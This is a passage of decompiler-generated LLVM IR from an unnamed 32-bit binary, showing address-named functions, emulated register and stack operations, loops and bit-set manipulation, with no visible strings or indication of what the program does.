  %v2_8048a89 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a89, i32* @ebx, align 4
  %v0_8048a90 = load i32, i32* @esp, align 4
  %v1_8048a90 = inttoptr i32 %v0_8048a90 to i32*
  %v2_8048a90 = load i32, i32* %v1_8048a90, align 4
  store i32 %v2_8048a90, i32* %eax.global-to-local, align 4
  %v1_8048a91 = add i32 %v0_8048a90, 68
  %v2_8048a91 = inttoptr i32 %v1_8048a91 to i32*
  %v3_8048a91 = load i32, i32* %v2_8048a91, align 4
  store i32 %v3_8048a91, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a91, i32* %v1_8048a90, align 4
  %v2_8048a96 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048a96, i32* %eax.global-to-local, align 4
  %v0_8048a9b = load i32, i32* @esp, align 4
  %v1_8048a9e = add i32 %v0_8048a9b, 10388
  %v1_8048aa5 = load i32, i32* @ebx, align 4
  %v2_8048aa5 = add i32 %v1_8048a9e, %v1_8048aa5
  %v12_8048aa5 = icmp eq i32 %v2_8048aa5, 0
  store i1 %v12_8048aa5, i1* %zf.global-to-local, align 1
  store i32 %v2_8048aa5, i32* %edx.global-to-local, align 4
  %v2_8048aa7 = add i32 %v0_8048a9b, 8
  %v3_8048aa7 = inttoptr i32 %v2_8048aa7 to i32*
  store i32 %v2_8048aa5, i32* %v3_8048aa7, align 4
  %v1_8048aa8 = add i32 %v0_8048a9b, 4
  %v2_8048aa8 = inttoptr i32 %v1_8048aa8 to i32*
  store i32 10, i32* %v2_8048aa8, align 4
  %v3_8048aaa = inttoptr i32 %v0_8048a9b to i32*
  store i32 %v2_8048a96, i32* %v3_8048aaa, align 4
  %v4_8048aab = call i32 @function_80529f0(i64 %v3_8048aab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048aab, i32* %eax.global-to-local, align 4
  %v0_8048ab0 = load i32, i32* @esp, align 4
  %v1_8048ab0 = inttoptr i32 %v0_8048ab0 to i32*
  %v2_8048ab0 = load i32, i32* %v1_8048ab0, align 4
  store i32 %v2_8048ab0, i32* @ebx, align 4
  %v1_8048ab1 = add i32 %v0_8048ab0, 10388
  store i32 %v1_8048ab1, i32* %eax.global-to-local, align 4
  store i32 %v1_8048ab1, i32* %v1_8048ab0, align 4
  %v2_8048ab9 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048ab9, i32* %eax.global-to-local, align 4
  %v0_8048abe = load i32, i32* @esp, align 4
  %v1_8048abe = inttoptr i32 %v0_8048abe to i32*
  %v2_8048abe = load i32, i32* %v1_8048abe, align 4
  store i32 %v2_8048abe, i32* %edx.global-to-local, align 4
  %v3_8048abe = add i32 %v0_8048abe, 4
  %v1_8048abf = inttoptr i32 %v3_8048abe to i32*
  %v2_8048abf = load i32, i32* %v1_8048abf, align 4
  store i32 %v2_8048abf, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v1_8048abf, align 4
  %v1_8048ac5 = add i32 %v0_8048abe, 10388
  store i32 %v1_8048ac5, i32* %edx.global-to-local, align 4
  %v2_8048acc = add i32 %v1_8048ac5, %v2_8048ab9
  store i32 %v2_8048acc, i32* %eax.global-to-local, align 4
  store i32 %v2_8048acc, i32* %v1_8048abe, align 4
  %v3_8048ad0 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048ad0, i32* %eax.global-to-local, align 4
  %v0_8048ad5 = load i32, i32* @esp, align 4
  %v1_8048ad5 = add i32 %v0_8048ad5, 16
  %v6_8048ad5 = icmp eq i32 %v1_8048ad5, 0
  store i1 %v6_8048ad5, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ad8

dec_label_pc_8048ad8:                             ; preds = %dec_label_pc_8048700, %dec_label_pc_80489c4
  %v0_8048ae3 = phi i32 [ %v1_80489b5, %dec_label_pc_8048700 ], [ %v1_8048ad5, %dec_label_pc_80489c4 ]
  %v0_8048ad8 = load i32, i32* @esi, align 4
  %v1_8048ad8 = add i32 %v0_8048ad8, 28
  %v2_8048ad8 = inttoptr i32 %v1_8048ad8 to i32*
  %v3_8048ad8 = load i32, i32* %v2_8048ad8, align 4
  store i32 %v3_8048ad8, i32* @ebx, align 4
  %v1_8048adb = icmp eq i32 %v3_8048ad8, 0
  store i1 %v1_8048adb, i1* %zf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v3_8048ad8, 1
  br i1 %tmp140, label %dec_label_pc_8048bb4, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048ad8
  %v9_8048ae3 = icmp eq i32 %v0_8048ae3, 12
  store i1 %v9_8048ae3, i1* %zf.global-to-local, align 1
  %v1_8048ae6 = add i32 %v0_8048ae3, 10372
  store i32 %v1_8048ae6, i32* %ecx.global-to-local, align 4
  %v2_8048aed = add i32 %v0_8048ae3, -16
  %v3_8048aed = inttoptr i32 %v2_8048aed to i32*
  store i32 %v1_8048ae6, i32* %v3_8048aed, align 4
  %v2_8048aee = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048aee, i32* %eax.global-to-local, align 4
  %v0_8048af3 = load i32, i32* @esp, align 4
  %v1_8048af3 = inttoptr i32 %v0_8048af3 to i32*
  %v2_8048af3 = load i32, i32* %v1_8048af3, align 4
  store i32 %v2_8048af3, i32* %edx.global-to-local, align 4
  %v3_8048af3 = add i32 %v0_8048af3, 4
  %v1_8048af4 = inttoptr i32 %v3_8048af3 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  store i32 %v2_8048af4, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8055498.11 to i32), i32* %v1_8048af4, align 4
  %v1_8048afa = add i32 %v0_8048af3, 10388
  store i32 %v1_8048afa, i32* %edx.global-to-local, align 4
  %v2_8048b01 = add i32 %v1_8048afa, %v2_8048aee
  store i32 %v2_8048b01, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b01, i32* %v1_8048af3, align 4
  %v3_8048b05 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b05, i32* %eax.global-to-local, align 4
  %v0_8048b0a = load i32, i32* @esp, align 4
  %v1_8048b0a = add i32 %v0_8048b0a, 20916
  %v2_8048b0a = inttoptr i32 %v1_8048b0a to i32*
  store i32 0, i32* %v2_8048b0a, align 4
  %v0_8048b15 = load i32, i32* @esp, align 4
  %v1_8048b15 = add i32 %v0_8048b15, 16
  %v0_8048b18 = load i32, i32* @esi, align 4
  %v1_8048b18 = add i32 %v0_8048b18, 28
  %v2_8048b18 = inttoptr i32 %v1_8048b18 to i32*
  %v3_8048b18 = load i32, i32* %v2_8048b18, align 4
  store i32 %v3_8048b18, i32* %ebx.global-to-local, align 4
  %v1_8048b1b = icmp eq i32 %v3_8048b18, 0
  store i1 %v1_8048b1b, i1* %zf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v3_8048b18, 1
  br i1 %tmp141, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ae3
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8048b21

dec_label_pc_8048b21:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048b1f
  %v0_8048b24 = phi i32 [ %v1_8048b82, %dec_label_pc_8048b21 ], [ %v1_8048b15, %dec_label_pc_8048b1f ]
  %v0_8048b21 = phi i32 [ %v4_8048b85, %dec_label_pc_8048b21 ], [ 0, %dec_label_pc_8048b1f ]
  %v2_8048b21 = mul i32 %v0_8048b21, 128
  store i32 %v2_8048b21, i32* @ebx, align 4
  %v9_8048b24 = icmp eq i32 %v0_8048b24, 12
  store i1 %v9_8048b24, i1* %zf.global-to-local, align 1
  %v1_8048b27 = add i32 %v0_8048b24, 10372
  store i32 %v1_8048b27, i32* %ecx.global-to-local, align 4
  %v2_8048b2e = add i32 %v0_8048b24, -16
  %v3_8048b2e = inttoptr i32 %v2_8048b2e to i32*
  store i32 %v1_8048b27, i32* %v3_8048b2e, align 4
  %v2_8048b2f = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esp, align 4
  %v1_8048b34 = inttoptr i32 %v0_8048b34 to i32*
  %v3_8048b34 = add i32 %v0_8048b34, 4
  %v0_8048b35 = load i32, i32* @ebx, align 4
  %v1_8048b35 = load i32, i32* @edi, align 4
  %v2_8048b35 = add i32 %v0_8048b35, 1472
  %v3_8048b35 = add i32 %v2_8048b35, %v1_8048b35
  store i32 %v3_8048b35, i32* %edx.global-to-local, align 4
  %v1_8048b3c = inttoptr i32 %v3_8048b34 to i32*
  %v2_8048b3c = load i32, i32* %v1_8048b3c, align 4
  store i32 %v2_8048b3c, i32* %ecx.global-to-local, align 4
  store i32 %v3_8048b35, i32* %v1_8048b3c, align 4
  %v1_8048b3e = add i32 %v0_8048b34, 10388
  store i32 %v1_8048b3e, i32* %edx.global-to-local, align 4
  %v2_8048b45 = add i32 %v1_8048b3e, %v2_8048b2f
  store i32 %v2_8048b45, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b45, i32* %v1_8048b34, align 4
  %v3_8048b49 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b49, i32* %eax.global-to-local, align 4
  %v0_8048b4e = load i32, i32* @esp, align 4
  %v1_8048b4e = inttoptr i32 %v0_8048b4e to i32*
  %v2_8048b4e = load i32, i32* %v1_8048b4e, align 4
  store i32 %v2_8048b4e, i32* @ebx, align 4
  %v1_8048b4f = add i32 %v0_8048b4e, 10388
  store i32 %v1_8048b4f, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048b4f, i32* %v1_8048b4e, align 4
  %v2_8048b57 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048b57, i32* %eax.global-to-local, align 4
  %v0_8048b5c = load i32, i32* @esp, align 4
  %v1_8048b5c = inttoptr i32 %v0_8048b5c to i32*
  %v2_8048b5c = load i32, i32* %v1_8048b5c, align 4
  store i32 %v2_8048b5c, i32* %edx.global-to-local, align 4
  %v3_8048b5c = add i32 %v0_8048b5c, 4
  %v1_8048b5d = inttoptr i32 %v3_8048b5c to i32*
  %v2_8048b5d = load i32, i32* %v1_8048b5d, align 4
  store i32 %v2_8048b5d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554a1.12 to i32), i32* %v1_8048b5d, align 4
  %v1_8048b63 = add i32 %v0_8048b5c, 10388
  store i32 %v1_8048b63, i32* %edx.global-to-local, align 4
  %v2_8048b6a = add i32 %v1_8048b63, %v2_8048b57
  store i32 %v2_8048b6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b6a, i32* %v1_8048b5c, align 4
  %v3_8048b6e = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b6e, i32* %eax.global-to-local, align 4
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v1_8048b73 = add i32 %v0_8048b73, 20916
  %v2_8048b73 = inttoptr i32 %v1_8048b73 to i32*
  %v3_8048b73 = load i32, i32* %v2_8048b73, align 4
  %v1_8048b7a = add i32 %v3_8048b73, 1
  store i32 %v1_8048b7a, i32* %ebx.global-to-local, align 4
  store i32 %v1_8048b7a, i32* %v2_8048b73, align 4
  %v0_8048b82 = load i32, i32* @esp, align 4
  %v1_8048b82 = add i32 %v0_8048b82, 16
  %v0_8048b85 = load i32, i32* @esi, align 4
  %v1_8048b85 = add i32 %v0_8048b85, 28
  %v2_8048b85 = inttoptr i32 %v1_8048b85 to i32*
  %v3_8048b85 = load i32, i32* %v2_8048b85, align 4
  %v4_8048b85 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8048b85 = sub i32 %v3_8048b85, %v4_8048b85
  %v11_8048b85 = xor i32 %v4_8048b85, %v3_8048b85
  %v12_8048b85 = xor i32 %v5_8048b85, %v3_8048b85
  %v13_8048b85 = and i32 %v12_8048b85, %v11_8048b85
  %v14_8048b85 = icmp slt i32 %v13_8048b85, 0
  %v15_8048b85 = icmp eq i32 %v5_8048b85, 0
  store i1 %v15_8048b85, i1* %zf.global-to-local, align 1
  %v16_8048b85 = icmp slt i32 %v5_8048b85, 0
  %v3_8048b88 = icmp eq i1 %v16_8048b85, %v14_8048b85
  %v4_8048b88 = icmp eq i1 %v15_8048b85, false
  %v5_8048b88 = and i1 %v4_8048b88, %v3_8048b88
  br i1 %v5_8048b88, label %dec_label_pc_8048b21, label %dec_label_pc_8048b8a

dec_label_pc_8048b8a:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048ae3
  %v0_8048b8a = phi i32 [ %v1_8048b15, %dec_label_pc_8048ae3 ], [ %v1_8048b82, %dec_label_pc_8048b21 ]
  %v9_8048b8a = icmp eq i32 %v0_8048b8a, 12
  store i1 %v9_8048b8a, i1* %zf.global-to-local, align 1
  %v1_8048b8d = add i32 %v0_8048b8a, 10372
  store i32 %v1_8048b8d, i32* %ecx.global-to-local, align 4
  %v2_8048b94 = add i32 %v0_8048b8a, -16
  %v3_8048b94 = inttoptr i32 %v2_8048b94 to i32*
  store i32 %v1_8048b8d, i32* %v3_8048b94, align 4
  %v2_8048b95 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048b95, i32* %eax.global-to-local, align 4
  %v0_8048b9a = load i32, i32* @esp, align 4
  %v1_8048b9a = inttoptr i32 %v0_8048b9a to i32*
  %v2_8048b9a = load i32, i32* %v1_8048b9a, align 4
  store i32 %v2_8048b9a, i32* @ebx, align 4
  %v3_8048b9a = add i32 %v0_8048b9a, 4
  %v1_8048b9b = inttoptr i32 %v3_8048b9a to i32*
  %v2_8048b9b = load i32, i32* %v1_8048b9b, align 4
  store i32 %v2_8048b9b, i32* %edi.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v1_8048b9b, align 4
  %v1_8048ba1 = add i32 %v0_8048b9a, 10388
  store i32 %v1_8048ba1, i32* %edx.global-to-local, align 4
  %v2_8048ba8 = add i32 %v1_8048ba1, %v2_8048b95
  store i32 %v2_8048ba8, i32* %eax.global-to-local, align 4
  store i32 %v2_8048ba8, i32* %v1_8048b9a, align 4
  %v3_8048bac = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bac, i32* %eax.global-to-local, align 4
  %v0_8048bb1 = load i32, i32* @esp, align 4
  %v1_8048bb1 = add i32 %v0_8048bb1, 16
  %v6_8048bb1 = icmp eq i32 %v1_8048bb1, 0
  store i1 %v6_8048bb1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ad8, %dec_label_pc_8048b8a
  %v0_8048bb4 = phi i32 [ %v0_8048ae3, %dec_label_pc_8048ad8 ], [ %v1_8048bb1, %dec_label_pc_8048b8a ]
  %v9_8048bb4 = icmp eq i32 %v0_8048bb4, 12
  store i1 %v9_8048bb4, i1* %zf.global-to-local, align 1
  %v1_8048bb7 = add i32 %v0_8048bb4, 10372
  store i32 %v1_8048bb7, i32* %ecx.global-to-local, align 4
  %v2_8048bbe = add i32 %v0_8048bb4, -16
  %v3_8048bbe = inttoptr i32 %v2_8048bbe to i32*
  store i32 %v1_8048bb7, i32* %v3_8048bbe, align 4
  %v2_8048bbf = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048bbf, i32* %eax.global-to-local, align 4
  %v0_8048bc4 = load i32, i32* @esp, align 4
  %v1_8048bc4 = inttoptr i32 %v0_8048bc4 to i32*
  %v2_8048bc4 = load i32, i32* %v1_8048bc4, align 4
  store i32 %v2_8048bc4, i32* %edx.global-to-local, align 4
  %v3_8048bc4 = add i32 %v0_8048bc4, 4
  %v1_8048bc5 = inttoptr i32 %v3_8048bc4 to i32*
  %v2_8048bc5 = load i32, i32* %v1_8048bc5, align 4
  store i32 %v2_8048bc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v1_8048bc5, align 4
  %v1_8048bcb = add i32 %v0_8048bc4, 10388
  store i32 %v1_8048bcb, i32* %edx.global-to-local, align 4
  %v2_8048bd2 = add i32 %v1_8048bcb, %v2_8048bbf
  store i32 %v2_8048bd2, i32* %eax.global-to-local, align 4
  store i32 %v2_8048bd2, i32* %v1_8048bc4, align 4
  %v3_8048bd6 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bd6, i32* %eax.global-to-local, align 4
  %v0_8048bdb = load i32, i32* @esp, align 4
  %v1_8048bdb = add i32 %v0_8048bdb, 16
  %v1_8048bde = add i32 %v0_8048bdb, 68
  %v2_8048bde = inttoptr i32 %v1_8048bde to i32*
  %v3_8048bde = load i32, i32* %v2_8048bde, align 4
  store i32 %v3_8048bde, i32* @edi, align 4
  %v1_8048be2 = icmp eq i32 %v3_8048bde, 0
  store i1 %v1_8048be2, i1* %zf.global-to-local, align 1
  br i1 %v1_8048be2, label %dec_label_pc_8048c10, label %dec_label_pc_8048be6

dec_label_pc_8048be6:                             ; preds = %dec_label_pc_8048bb4
  %v9_8048be6 = icmp eq i32 %v0_8048bdb, -4
  store i1 %v9_8048be6, i1* %zf.global-to-local, align 1
  %v1_8048be9 = add i32 %v0_8048bdb, 10388
  store i32 %v1_8048be9, i32* %ecx.global-to-local, align 4
  %v3_8048bf0 = inttoptr i32 %v0_8048bdb to i32*
  store i32 %v1_8048be9, i32* %v3_8048bf0, align 4
  %v2_8048bf1 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8048bf1, i32* %eax.global-to-local, align 4
  %v0_8048bf6 = load i32, i32* @esp, align 4
  %v1_8048bf6 = inttoptr i32 %v0_8048bf6 to i32*
  %v2_8048bf6 = load i32, i32* %v1_8048bf6, align 4
  store i32 %v2_8048bf6, i32* %ecx.global-to-local, align 4
  %v3_8048bf6 = add i32 %v0_8048bf6, 4
  %v1_8048bf7 = inttoptr i32 %v3_8048bf6 to i32*
  %v2_8048bf7 = load i32, i32* %v1_8048bf7, align 4
  store i32 %v2_8048bf7, i32* @ebx, align 4
  %v1_8048bf8 = add i32 %v0_8048bf6, 68
  %v2_8048bf8 = inttoptr i32 %v1_8048bf8 to i32*
  %v3_8048bf8 = load i32, i32* %v2_8048bf8, align 4
  store i32 %v3_8048bf8, i32* %v1_8048bf7, align 4
  %v1_8048bfd = add i32 %v0_8048bf6, 10388
  store i32 %v1_8048bfd, i32* %edx.global-to-local, align 4
  %v2_8048c04 = add i32 %v1_8048bfd, %v2_8048bf1
  store i32 %v2_8048c04, i32* %eax.global-to-local, align 4
  store i32 %v2_8048c04, i32* %v1_8048bf6, align 4
  %v3_8048c08 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048c08, i32* %eax.global-to-local, align 4
  %v0_8048c0d = load i32, i32* @esp, align 4
  %v1_8048c0d = add i32 %v0_8048c0d, 16
  %v6_8048c0d = icmp eq i32 %v1_8048c0d, 0
  store i1 %v6_8048c0d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c10

dec_label_pc_8048c10:                             ; preds = %dec_label_pc_8048bb4, %dec_label_pc_8048be6
  %v1_8048c10 = phi i32 [ %v1_8048bdb, %dec_label_pc_8048bb4 ], [ %v1_8048c0d, %dec_label_pc_8048be6 ]
  %v0_8048c10 = phi i32 [ %v3_8048bd6, %dec_label_pc_8048bb4 ], [ %v3_8048c08, %dec_label_pc_8048be6 ]
  %v2_8048c10 = add i32 %v1_8048c10, -4
  %v3_8048c10 = inttoptr i32 %v2_8048c10 to i32*
  store i32 %v0_8048c10, i32* %v3_8048c10, align 4
  %v0_8048c11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048c11 = add i32 %v1_8048c10, -8
  %v3_8048c11 = inttoptr i32 %v2_8048c11 to i32*
  store i32 %v0_8048c11, i32* %v3_8048c11, align 4
  %v0_8048c12 = load i32, i32* @esi, align 4
  %v2_8048c12 = add i32 %v1_8048c10, -12
  %v3_8048c12 = inttoptr i32 %v2_8048c12 to i32*
  store i32 %v0_8048c12, i32* %v3_8048c12, align 4
  %v1_8048c13 = add i32 %v1_8048c10, 96
  %v2_8048c13 = inttoptr i32 %v1_8048c13 to i32*
  %v3_8048c13 = load i32, i32* %v2_8048c13, align 4
  store i32 %v3_8048c13, i32* %eax.global-to-local, align 4
  %v2_8048c17 = add i32 %v1_8048c10, -16
  %v3_8048c17 = inttoptr i32 %v2_8048c17 to i32*
  store i32 %v3_8048c13, i32* %v3_8048c17, align 4
  %v0_8048c18 = call i32 @function_8052950()
  store i32 %v0_8048c18, i32* %eax.global-to-local, align 4
  %v0_8048c1d = load i32, i32* @esp, align 4
  %v1_8048c1d = add i32 %v0_8048c1d, 16
  %v3_8048c20 = trunc i32 %v0_8048c18 to i8
  %v4_8048c20 = icmp eq i8 %v3_8048c20, 0
  store i1 %v4_8048c20, i1* %zf.global-to-local, align 1
  br i1 %v4_8048c20, label %dec_label_pc_804979e, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c10, %dec_label_pc_804979e
  %v0_8048c28 = phi i32 [ %v1_8048c1d, %dec_label_pc_8048c10 ], [ %v1_80497ab, %dec_label_pc_804979e ]
  %v9_8048c28 = icmp eq i32 %v0_8048c28, 12
  store i1 %v9_8048c28, i1* %zf.global-to-local, align 1
  %v1_8048c2b = add i32 %v0_8048c28, 10372
  store i32 %v1_8048c2b, i32* %ecx.global-to-local, align 4
  %v2_8048c32 = add i32 %v0_8048c28, -16
  %v3_8048c32 = inttoptr i32 %v2_8048c32 to i32*
  store i32 %v1_8048c2b, i32* %v3_8048c32, align 4
  %v2_8048c33 = call i32 @function_80525e0(i8* %v1_8048752)
  %v0_8048c38 = load i32, i32* @esp, align 4
  %v1_8048c38 = add i32 %v0_8048c38, -4
  %v2_8048c38 = inttoptr i32 %v1_8048c38 to i32*
  store i32 16384, i32* %v2_8048c38, align 4
  %v2_8048c3d = add i32 %v0_8048c38, -8
  %v3_8048c3d = inttoptr i32 %v2_8048c3d to i32*
  store i32 %v2_8048c33, i32* %v3_8048c3d, align 4
  %v1_8048c3e = add i32 %v0_8048c38, 10388
  store i32 %v1_8048c3e, i32* %eax.global-to-local, align 4
  %v2_8048c45 = add i32 %v0_8048c38, -12
  %v3_8048c45 = inttoptr i32 %v2_8048c45 to i32*
  store i32 %v1_8048c3e, i32* %v3_8048c45, align 4
  %v0_8048c46 = load i32, i32* @esi, align 4
  %v1_8048c46 = add i32 %v0_8048c46, -1440
  %v2_8048c46 = inttoptr i32 %v1_8048c46 to i32*
  %v3_8048c46 = load i32, i32* %v2_8048c46, align 4
  store i32 %v3_8048c46, i32* %ecx.global-to-local, align 4
  %v2_8048c4c = add i32 %v0_8048c38, -16
  %v3_8048c4c = inttoptr i32 %v2_8048c4c to i32*
  store i32 %v3_8048c46, i32* %v3_8048c4c, align 4
  %v0_8048c4d = call i32 @function_80532c4()
  store i32 %v0_8048c4d, i32* %eax.global-to-local, align 4
  %v0_8048c52 = load i32, i32* @esp, align 4
  %v1_8048c52 = add i32 %v0_8048c52, 112
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  %v3_8048c52 = load i32, i32* %v2_8048c52, align 4
  store i32 %v3_8048c52, i32* %edx.global-to-local, align 4
  %v0_8048c56 = load i32, i32* @esi, align 4
  %v1_8048c56 = add i32 %v0_8048c56, -1440
  %v2_8048c56 = inttoptr i32 %v1_8048c56 to i32*
  %v3_8048c56 = load i32, i32* %v2_8048c56, align 4
  store i32 %v3_8048c56, i32* %eax.global-to-local, align 4
  %v2_8048c5c = add i32 %v0_8048c56, -1428
  %v3_8048c5c = inttoptr i32 %v2_8048c5c to i32*
  store i32 %v3_8048c52, i32* %v3_8048c5c, align 4
  %v0_8048c62 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048c62, i32* %edx.global-to-local, align 4
  %v0_8048c64 = load i32, i32* @esi, align 4
  %v1_8048c64 = add i32 %v0_8048c64, -1436
  %v2_8048c64 = inttoptr i32 %v1_8048c64 to i8*
  store i8 6, i8* %v2_8048c64, align 1
  %v0_8048c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8048c6b = urem i32 %v0_8048c6b, 32
  store i32 %v1_8048c6b, i32* %eax.global-to-local, align 4
  %v0_8048c6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8048c6e = udiv i32 %v0_8048c6e, 32
  store i32 %v2_8048c6e, i32* %edx.global-to-local, align 4
  %v0_8048c71 = load i32, i32* @esp, align 4
  %v2_8048c71 = mul nuw nsw i32 %v2_8048c6e, 4
  %v3_8048c71 = add nuw nsw i32 %v2_8048c71, 20772
  %v4_8048c71 = add i32 %v3_8048c71, %v0_8048c71
  %v5_8048c71 = inttoptr i32 %v4_8048c71 to i32*
  %v6_8048c71 = load i32, i32* %v5_8048c71, align 4
  %v9_8048c71 = shl i32 1, %v1_8048c6b
  %v12_8048c71 = or i32 %v6_8048c71, %v9_8048c71
  %v16_8048c71 = add i32 %v0_8048c71, 20772
  %v17_8048c71 = add i32 %v16_8048c71, %v2_8048c71
  %v18_8048c71 = inttoptr i32 %v17_8048c71 to i32*
  store i32 %v12_8048c71, i32* %v18_8048c71, align 4
  %v0_8048c79 = load i32, i32* @esp, align 4
  %v1_8048c79 = add i32 %v0_8048c79, 32
  %v0_8048c7c = load i32, i32* @esi, align 4
  %v1_8048c7c = add i32 %v0_8048c7c, -1440
  %v2_8048c7c = inttoptr i32 %v1_8048c7c to i32*
  %v3_8048c7c = load i32, i32* %v2_8048c7c, align 4
  store i32 %v3_8048c7c, i32* %eax.global-to-local, align 4
  %v1_8048c82 = add i32 %v0_8048c79, 104
  %v2_8048c82 = inttoptr i32 %v1_8048c82 to i32*
  %v3_8048c82 = load i32, i32* %v2_8048c82, align 4
  %v5_8048c82 = sub i32 %v3_8048c82, %v3_8048c7c
  %v11_8048c82 = xor i32 %v3_8048c82, %v3_8048c7c
  %v12_8048c82 = xor i32 %v5_8048c82, %v3_8048c82
  %v13_8048c82 = and i32 %v12_8048c82, %v11_8048c82
  %v14_8048c82 = icmp slt i32 %v13_8048c82, 0
  %v15_8048c82 = icmp eq i32 %v5_8048c82, 0
  store i1 %v15_8048c82, i1* %zf.global-to-local, align 1
  %v16_8048c82 = icmp slt i32 %v5_8048c82, 0
  %v2_8048c86 = icmp eq i1 %v16_8048c82, %v14_8048c82
  br i1 %v2_8048c86, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_80486ee
  store i8 0, i8* %v2_80485a5, align 1
  br label %dec_label_pc_80485be

dec_label_pc_8048c9d:                             ; preds = %dec_label_pc_8048537
  %v0_8048c9d = load i32, i32* @esp, align 4
  %v1_8048c9d = add i32 %v0_8048c9d, 80
  %v2_8048c9d = inttoptr i32 %v1_8048c9d to i32*
  %v3_8048c9d = load i32, i32* %v2_8048c9d, align 4
  store i32 %v3_8048c9d, i32* %eax.global-to-local, align 4
  %v1_8048ca1 = add i32 %v0_80485a5, -1432
  %v2_8048ca1 = inttoptr i32 %v1_8048ca1 to i32*
  %v3_8048ca1 = load i32, i32* %v2_8048ca1, align 4
  store i32 %v3_8048ca1, i32* @ebx, align 4
  %v2_8048ca7 = sub i32 %v3_8048c9d, %v3_8048ca1
  store i32 %v2_8048ca7, i32* %eax.global-to-local, align 4
  %v9_8048ca9 = icmp eq i32 %v2_8048ca7, 30
  store i1 %v9_8048ca9, i1* %zf.global-to-local, align 1
  %tmp240 = icmp ult i32 %v2_8048ca7, 31
  br i1 %tmp240, label %dec_label_pc_8048cb2, label %dec_label_pc_804855f

dec_label_pc_8048cb2:                             ; preds = %dec_label_pc_8048c9d
  %v1_8048cb2 = add i32 %v0_80485a5, -1440
  %v2_8048cb2 = inttoptr i32 %v1_8048cb2 to i32*
  %v3_8048cb2 = load i32, i32* %v2_8048cb2, align 4
  %v1_8048cba = urem i32 %v3_8048cb2, 32
  store i32 %v1_8048cba, i32* %eax.global-to-local, align 4
  %v2_8048cbd = udiv i32 %v3_8048cb2, 32
  store i32 %v2_8048cbd, i32* %edx.global-to-local, align 4
  %v2_8048cc0 = mul nuw nsw i32 %v2_8048cbd, 4
  %v3_8048cc0 = add i32 %v0_8048c9d, 20612
  %v4_8048cc0 = add i32 %v3_8048cc0, %v2_8048cc0
  %v5_8048cc0 = inttoptr i32 %v4_8048cc0 to i32*
  %v6_8048cc0 = load i32, i32* %v5_8048cc0, align 4
  %v9_8048cc0 = shl i32 1, %v1_8048cba
  %v12_8048cc0 = or i32 %v6_8048cc0, %v9_8048cc0
  store i32 %v12_8048cc0, i32* %v5_8048cc0, align 4
  %v0_8048cc8 = load i32, i32* @esi, align 4
  %v1_8048cc8 = add i32 %v0_8048cc8, -1440
  %v2_8048cc8 = inttoptr i32 %v1_8048cc8 to i32*
  %v3_8048cc8 = load i32, i32* %v2_8048cc8, align 4
  store i32 %v3_8048cc8, i32* %eax.global-to-local, align 4
  %v0_8048cce = load i32, i32* @esp, align 4
  %v1_8048cce = add i32 %v0_8048cce, 72
